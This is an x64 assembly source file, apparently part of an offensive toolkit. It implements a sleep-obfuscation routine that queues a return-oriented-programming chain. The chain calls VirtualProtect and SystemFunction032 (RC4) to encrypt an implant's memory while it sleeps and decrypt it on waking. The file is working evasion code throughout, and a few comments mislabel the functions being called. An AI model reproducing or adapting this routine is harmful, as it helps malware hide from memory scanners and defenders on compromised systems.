WorkCallback proto

.code

WorkCallback proc

    ; Queuing up a shitty rop chain that triggers from the return

    ; seems to work fine without padding between this virtualprotect and returning to code

    ; 2nd Virtual Protect
    push    qword ptr [rdx + 40h]       ; VirtualProtect address 
    push    qword ptr [rdx + 70h]       ; arg4 (out lpflOldProtect)
    push    20h                         ; arg3 (flNewProtect), RX
    push    qword ptr [rdx + 80h]       ; arg1 (lpAddress)
    push    qword ptr [rdx + 78h]       ; arg2 (dwSize)
    push    qword ptr [rdx + 38h]       ; pop rdx; pop rcx; pop r8; pop r9; ret;

    ; padding
    push    22
    push    22
    push    22
    push    22
    push    22
    push    qword ptr [rdx + 88h]       ; add rsp 28h; ret

    ; SystemFunction032
    push    qword ptr [rdx + 48h]       ; VirtualProtect address 
    push    22                          ; arg4 (nothing)
    push    22                          ; arg3 (nothing)
    push    qword ptr [rdx + 58h]       ; arg1 (ustring* data)
    push    qword ptr [rdx + 60h]       ; arg2 (ustring* key)
    push    qword ptr [rdx + 38h]       ; pop rdx; pop rcx; pop r8; pop r9; ret;

    ; padding
    push    22
    push    22
    push    22
    push    22
    push    22
    push    qword ptr [rdx + 88h]       ; add rsp 28h; ret

    ; 2nd Sleep, "the real sleep"
    push    qword ptr [rdx + 50h]       ; Sleep address 
    push    22                          ; arg4 (nothing)
    push    22                          ; arg3 (nothing)
    push    -1                          ; arg1 (Handle)
    push    qword ptr [rdx + 68h]       ; arg2 (SleepTime)
    push    qword ptr [rdx + 38h]       ; pop rdx; pop rcx; pop r8; pop r9; ret;

    ; padding
    push    22
    push    22
    push    22
    push    22
    push    22
    push    qword ptr [rdx + 88h]       ; add rsp 28h; ret

    ; SystemFunction032
    push    qword ptr [rdx + 48h]       ; VirtualProtect address 
    push    22                          ; arg4 (nothing)
    push    22                          ; arg3 (nothing)
    push    qword ptr [rdx + 58h]       ; arg1 (ustring* data)
    push    qword ptr [rdx + 60h]       ; arg2 (ustring* key)
    push    qword ptr [rdx + 38h]       ; pop rdx; pop rcx; pop r8; pop r9; ret;

    ; padding
    push    22
    push    22
    push    22
    push    22
    push    22
    push    qword ptr [rdx + 88h]       ; add rsp 28h; ret

    ; 1st Virtual Protect
    push    qword ptr [rdx + 40h]       ; VirtualProtect address 
    push    qword ptr [rdx + 70h]       ; arg4 (out lpflOldProtect)
    push    4h                          ; arg3 (flNewProtect), RW
    push    qword ptr [rdx + 80h]       ; arg1 (lpAddress)
    push    qword ptr [rdx + 78h]       ; arg2 (dwSize)
    push    qword ptr [rdx + 38h]       ; pop rdx; pop rcx; pop r8; pop r9; ret;

    ; padding
    push    22
    push    22
    push    22
    push    22
    push    22
    push    qword ptr [rdx + 88h]       ; add rsp 28h; ret

    ; 1st Sleep, so then protect doesn't run before the TPWAITFORWORK call.
    push    qword ptr [rdx + 50h]       ; Sleep address 
    push    22                          ; arg4 (nothing)
    push    22                          ; arg3 (nothing)
    push    -1                          ; arg1 (Handle)
    push    32h                         ; arg2 (SleepTime), 50 milliseconds
    push    qword ptr [rdx + 38h]       ; pop rdx; pop rcx; pop r8; pop r9; ret;
    ; Begin the ROP
    ret                                 ; return into the rop chain


WorkCallback endp

end
